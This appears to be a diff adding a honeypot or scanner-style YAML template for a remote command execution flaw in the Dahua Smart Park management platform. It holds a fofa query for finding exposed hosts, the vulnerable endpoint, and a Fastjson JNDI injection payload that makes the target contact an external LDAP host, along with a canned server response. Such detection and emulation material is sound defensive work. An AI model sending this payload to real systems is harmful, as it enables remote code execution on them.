@@ -1,0 +1,25 @@
+id: dahua-wpms-rce
+info:
+  name: Dahua Smart Park Integrated Management Platform - Remote Command Execution
+  author: DhiyaneshDK
+  description: Dahua Smart Park Integrated Management Platform is vulnerable to RCE.
+  severity: critical
+  reference:
+  - https://github.com/Vme18000yuan/FreePOC/blob/master/poc/pocsuite/dahua-zhyq-deleteftp-rce.py
+  metadata:
+    max-request: 1
+    fofa-query: body="src=\"/WPMS/asset/common/js/jsencrypt.min.js\""
+  tags: rce,dahua,wpms
+traps:
+- request:
+    method: POST
+    path: /CardSolution/card/accessControl/swingCardRecord/deleteFtp
+    headers:
+      Content-Type: application/json
+    body: '{"ftpUrl":{"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{interactsh-url}}","autoCommit":true}}}
+
+      '
+  response:
+    status_code: 200
+    headers: {}
+    body: autoCommitset property error
